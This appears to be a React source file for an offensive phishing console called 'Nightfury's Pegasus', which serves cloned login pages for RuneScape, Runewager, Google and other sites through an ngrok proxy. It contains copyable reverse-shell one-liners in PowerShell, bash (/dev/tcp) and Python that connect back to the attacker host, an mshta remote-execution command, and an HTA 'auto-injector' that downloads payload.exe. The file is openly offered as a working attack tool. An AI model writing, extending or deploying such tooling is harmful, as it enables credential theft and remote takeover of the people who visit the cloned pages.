import React, { useState } from 'react';
import { Shield, Globe, Terminal, ExternalLink, Copy, Check, Zap, Eye, Monitor, FileCode } from 'lucide-react';
import { cn } from '../lib/utils';
import { JAGEX_CLONE, RUNEWAGER_CLONE } from '../lib/clones';
import { generateHtaPayload } from '../lib/payloads';
import { toast } from 'sonner';

const CLONES = [
  { id: 'jagex', name: 'Jagex RuneScape', html: JAGEX_CLONE, url: 'https://runescape.com/login' },
  { id: 'runewager', name: 'Runewager', html: RUNEWAGER_CLONE, url: 'https://runewager.com/bet' },
  { id: 'google', name: 'Google Accounts', html: '<!-- Google Clone Placeholder -->', url: 'https://accounts.google.com' },
  { id: 'runechat', name: 'RuneChat', html: '<!-- RuneChat Clone Placeholder -->', url: 'https://runechat.com/login' },
  { id: 'runehall', name: 'RuneHall', html: '<!-- RuneHall Clone Placeholder -->', url: 'https://runehall.com/login' },
];

export function PhishingConsole() {
  const [selectedClone, setSelectedClone] = useState(CLONES[0]);
  const [ngrokUrl, setNgrokUrl] = useState('https://pegasus-proxy.ngrok-free.app');
  const [isDeploying, setIsDeploying] = useState(false);
  const [showHta, setShowHta] = useState(false);
  const [copied, setCopied] = useState(false);
  const [copiedNgrok, setCopiedNgrok] = useState(false);

  const htaPayload = generateHtaPayload(`${ngrokUrl}/payload.exe`);

  const ONE_LINERS = [
    { name: 'PS RevShell', cmd: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ngrokUrl.replace('https://', '')}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` },
    { name: 'Bash RevShell', cmd: `bash -i >& /dev/tcp/${ngrokUrl.replace('https://', '')}/4444 0>&1` },
    { name: 'Python RevShell', cmd: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ngrokUrl.replace('https://', '')}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` },
    { name: 'MSHTA Execution', cmd: `mshta ${ngrokUrl}/payload.hta` },
  ];

  const handleDeploy = () => {
    setIsDeploying(true);
    toast.promise(
      new Promise((resolve) => setTimeout(resolve, 2000)),
      {
        loading: 'Deploying high-fidelity clone to Pegasus proxy...',
        success: () => {
          setIsDeploying(false);
          return `${selectedClone.name} clone deployed successfully.`;
        },
        error: 'Deployment failed.',
      }
    );
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    toast.success('URL copied to clipboard');
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="h-full flex flex-col gap-4 p-6 overflow-hidden bg-[#050505]">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <Shield className="text-[#F27D26]" size={24} />
          <div>
            <h2 className="text-xl font-mono font-bold tracking-tighter uppercase">Nightfury's Pegasus</h2>
            <p className="text-[10px] font-mono text-white/40 uppercase tracking-widest">High-Fidelity Phishing & HTA Injection</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <div className="flex items-center gap-2 px-2 py-1 bg-orange-500/10 border border-orange-500/20 rounded-full">
            <div className="w-1.5 h-1.5 rounded-full bg-orange-500 animate-pulse" />
            <span className="text-[8px] font-mono text-orange-500 uppercase font-bold">Pegasus Proxy Active</span>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 flex-1 overflow-hidden">
        {/* Configuration */}
        <div className="lg:col-span-1 space-y-4 overflow-y-auto pr-2 custom-scrollbar">
          <div className="p-4 bg-[#0a0a0a] border border-[#141414] rounded-lg space-y-4">
            <p className="text-[10px] font-mono text-white/20 uppercase tracking-widest mb-2">Clone Selection</p>
            
            <div className="space-y-2">
              {CLONES.map((clone) => (
                <button
                  key={clone.id}
                  onClick={() => setSelectedClone(clone)}
                  className={cn(
                    "w-full text-left p-3 rounded border transition-all flex items-center justify-between group",
                    selectedClone.id === clone.id 
                      ? "bg-[#F27D26]/10 border-[#F27D26] text-white" 
                      : "bg-black border-white/5 text-white/40 hover:border-white/20"
                  )}
                >
                  <div className="flex items-center gap-3">
                    <Globe size={14} className={selectedClone.id === clone.id ? "text-[#F27D26]" : "text-white/20"} />
                    <span className="text-xs font-mono font-bold">{clone.name}</span>
                  </div>
                  {selectedClone.id === clone.id && <Zap size={12} className="text-[#F27D26] animate-pulse" />}
                </button>
              ))}
            </div>

            <div className="space-y-1 pt-2">
              <label className="text-[9px] font-mono text-white/40 uppercase">Ngrok Proxy URL</label>
              <div className="flex items-center gap-2 bg-black border border-white/10 rounded px-2 py-1.5 focus-within:border-[#F27D26] transition-all">
                <Terminal size={14} className="text-white/20" />
                <input 
                  value={ngrokUrl}
                  onChange={(e) => setNgrokUrl(e.target.value)}
                  className="bg-transparent border-none text-xs font-mono w-full focus:outline-none text-white/80"
                  placeholder="https://your-proxy.ngrok-free.app"
                />
                <button 
                  onClick={() => {
                    copyToClipboard(ngrokUrl);
                    setCopiedNgrok(true);
                    setTimeout(() => setCopiedNgrok(false), 2000);
                  }}
                  className="text-white/20 hover:text-[#F27D26] transition-colors"
                  title="Copy Ngrok URL"
                >
                  {copiedNgrok ? <Check size={14} className="text-green-500" /> : <Copy size={14} />}
                </button>
              </div>
            </div>

            <button 
              onClick={handleDeploy}
              disabled={isDeploying}
              className={cn(
                "w-full py-3 rounded font-mono text-xs uppercase tracking-widest font-bold flex items-center justify-center gap-2 transition-all",
                isDeploying 
                  ? "bg-white/5 text-white/20 cursor-not-allowed" 
                  : "bg-[#F27D26] text-black hover:bg-orange-600 active:scale-95 shadow-[0_0_15px_rgba(242,125,38,0.3)]"
              )}
            >
              <Monitor size={16} />
              {isDeploying ? 'Deploying...' : 'Deploy Clone'}
            </button>
          </div>

          <div className="p-4 bg-[#0a0a0a] border border-[#141414] rounded-lg space-y-3">
            <p className="text-[10px] font-mono text-white/20 uppercase tracking-widest mb-2">HTA Auto-Injector</p>
            <div className="flex items-center justify-between p-2 bg-black rounded border border-white/5">
              <span className="text-[10px] font-mono text-white/60">Auto-Injection</span>
              <div className="w-8 h-4 bg-[#F27D26] rounded-full relative">
                <div className="absolute right-1 top-1 w-2 h-2 bg-white rounded-full" />
              </div>
            </div>
            <p className="text-[9px] font-mono text-white/30 leading-tight">
              When enabled, the clone will automatically attempt to trigger an HTA download/execution via the Pegasus proxy fallback mechanism.
            </p>
            <button 
              onClick={() => setShowHta(!showHta)}
              className="w-full py-2 rounded border border-[#F27D26]/20 text-[10px] font-mono text-[#F27D26] hover:bg-[#F27D26]/5 transition-all flex items-center justify-center gap-2"
            >
              <FileCode size={12} />
              {showHta ? 'Hide HTA Payload' : 'View HTA Payload'}
            </button>
            {showHta && (
              <div className="p-2 bg-black rounded border border-white/5 relative group">
                <pre className="text-[8px] font-mono text-white/40 overflow-x-auto whitespace-pre-wrap">
                  {htaPayload}
                </pre>
                <button 
                  onClick={() => copyToClipboard(htaPayload)}
                  className="absolute top-2 right-2 p-1 bg-white/5 rounded opacity-0 group-hover:opacity-100 transition-opacity"
                >
                  <Copy size={10} className="text-white/40" />
                </button>
              </div>
            )}
          </div>

          <div className="p-4 bg-[#0a0a0a] border border-[#141414] rounded-lg space-y-3">
            <p className="text-[10px] font-mono text-white/20 uppercase tracking-widest mb-2">Payload One-Liners</p>
            <div className="space-y-2">
              {ONE_LINERS.map((liner) => (
                <div key={liner.name} className="space-y-1">
                  <div className="flex items-center justify-between">
                    <span className="text-[9px] font-mono text-white/60 uppercase">{liner.name}</span>
                    <button 
                      onClick={() => copyToClipboard(liner.cmd)}
                      className="text-[8px] font-mono text-[#F27D26] hover:underline uppercase"
                    >
                      Copy
                    </button>
                  </div>
                  <div className="p-1.5 bg-black rounded border border-white/5 overflow-hidden">
                    <code className="text-[8px] font-mono text-white/20 truncate block">
                      {liner.cmd}
                    </code>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Preview */}
        <div className="lg:col-span-2 bg-black border border-[#141414] rounded-lg flex flex-col overflow-hidden relative">
          <div className="p-2 bg-[#0a0a0a] border-b border-[#141414] flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Eye size={14} className="text-[#F27D26]" />
              <span className="text-[10px] font-mono text-white/40 uppercase tracking-widest">Live Preview: {selectedClone.name}</span>
            </div>
            <div className="flex items-center gap-2">
              <div className="bg-black border border-white/10 rounded px-2 py-0.5 flex items-center gap-2">
                <span className="text-[9px] font-mono text-white/40 truncate max-w-[200px]">{ngrokUrl}/{selectedClone.id}</span>
                <button 
                  onClick={() => copyToClipboard(`${ngrokUrl}/${selectedClone.id}`)}
                  className="text-white/20 hover:text-white transition-colors"
                >
                  {copied ? <Check size={10} className="text-green-500" /> : <Copy size={10} />}
                </button>
              </div>
              <button className="p-1 hover:bg-white/5 rounded text-white/40 hover:text-white transition-all">
                <ExternalLink size={14} />
              </button>
            </div>
          </div>
          
          <div className="flex-1 bg-white overflow-hidden relative">
            <iframe 
              srcDoc={selectedClone.html}
              title="Clone Preview"
              className="w-full h-full border-none"
              sandbox="allow-scripts"
            />
            <div className="absolute inset-0 pointer-events-none border-4 border-orange-500/20 animate-pulse" />
          </div>
        </div>
      </div>
    </div>
  );
}
